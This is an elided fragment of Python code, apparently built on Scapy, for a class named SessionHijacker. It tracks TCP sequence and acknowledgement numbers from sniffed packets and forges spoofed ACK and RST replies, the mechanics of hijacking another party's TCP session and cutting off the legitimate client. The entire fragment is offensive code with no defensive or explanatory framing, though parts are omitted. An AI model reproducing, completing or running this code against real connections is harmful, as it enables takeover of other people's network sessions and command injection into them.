...
class SessionHijacker:
    ...
    def prepare_packet(self, packet, command):
        sequence = packet[TCP].seq + (len(packet[Raw].load) if packet.haslayer(Raw) else 0)
    ...
    def sniff_and_send(self, packet, command):
        ...
        send(self.build_ack_response(packet, False), verbose=False)
    ...
    def build_ack_response(self, packet, isServer):
        if isServer:
            seq = packet[TCP].ack
            ack = packet[TCP].seq + (len(packet[Raw].load) if packet.haslayer(Raw) else 0)
            return IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(dport=packet[TCP].sport, sport=packet[TCP].dport, flags='A', seq=seq, ack=ack)
        else:
            seq = packet[TCP].ack
            ack = packet[TCP].seq + (len(packet[Raw].load) if packet.haslayer(Raw) else 0)
            return IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(sport=packet[TCP].dport, dport=packet[TCP].sport, flags='R', seq=seq, ack=ack)
